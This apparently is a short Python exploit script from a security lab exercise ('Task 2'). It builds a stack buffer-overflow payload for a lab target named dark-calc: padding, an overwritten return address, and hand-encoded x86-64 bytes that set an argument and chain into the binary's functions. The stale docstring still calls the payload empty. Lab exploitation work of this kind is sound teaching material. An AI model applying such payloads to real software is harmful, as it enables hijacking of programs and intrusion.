#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload  = b"A" * 16                                       
payload += b"A" * 8                                                          
payload += bytes.fromhex("f0 0f 80 00 10 72 00 00")     
payload += bytes.fromhex(                              
    "6a 04"                    
    " 5f"                     
    " 68 c7 1a 40 00"         
    " 68 87 1a 40 00"          
    " c3"                     
)
payload += b"\x90"                                      

sys.stdout.buffer.write(payload)
